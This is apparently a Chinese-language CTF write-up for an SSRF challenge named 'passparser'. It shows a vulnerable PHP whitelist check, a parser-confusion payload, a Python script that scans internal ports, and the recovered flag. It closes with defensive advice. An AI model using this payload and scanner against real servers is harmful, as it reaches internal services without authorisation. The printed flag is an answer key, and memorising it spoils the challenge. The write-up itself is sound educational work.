# passparser

## 题目简述

前端把用户 URL 交给 verify.php。后端先用 PHP parse_url 解析并要求 host 等于公开站点域名，验证通过后却把原始字符串交给 cURL 请求。题面说明内部服务位于 localhost 的 9000–9030 端口。

PHP 响应头暴露版本 7.0.33，前端注释又明确提示后端使用 cURL。这些信号指向不同 URL 解析器对 authority、userinfo 和多个 @ 字符的解释差异。

## 解题过程

后端核心逻辑是：

~~~php
$parsed = parse_url($url);
if ($parsed["host"] === APP_HOST) {
    curl_setopt($curl_handle, CURLOPT_URL, $url);
    print(curl_exec($curl_handle));
}
~~~

Orange Tsai 的 Black Hat 论文 [A New Era of SSRF](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf) 说明：SSRF 白名单若由一个解析器检查、再由另一个请求器访问，同一 authority 字符串可能得到不同主机；论文专门给出了 cURL 与 PHP parse_url 对多重 userinfo 分隔符不一致的案例。

本题使用下面的结构：

~~~text
http://@localhost:PORT@APP_HOST
~~~

对旧版本 PHP，parse_url 把最后一段识别为允许的 APP_HOST；目标环境的 cURL 却把 localhost:PORT 当作实际连接目标。于是白名单看到公开域名，而请求实际进入内部端口。

在题面明确授权的 9000–9030 范围内做有界枚举：

~~~python
import requests

for port in range(9000, 9031):
    target = f"http://@localhost:{port}@{APP_HOST}"
    response = requests.get(
        f"{BASE_URL}/verify.php",
        params={"url": target},
        timeout=5,
    )
    if "shellmates{" in response.text:
        print(port, response.text)
        break
~~~

端口 9009 返回：

~~~text
shellmates{SsRF_iS_THE_B3St}
~~~

该 payload 依赖题目固定的旧解析器组合；现代 PHP/cURL 版本可能拒绝或重新解释它，不能把当前环境测试失败误认为原解法错误。

## 方法总结

SSRF 防护必须让“验证的 URL”和“实际请求的 URL”经过同一规范化与解析流程，并在解析后校验最终解析 IP。看到 parse_url、cURL、白名单域名和内部端口提示同时出现时，应比较它们对 userinfo、@、端口和 fragment 的处理。外部论文在本题中的必要结论和具体 authority 结构已写入正文，链接只用于溯源。
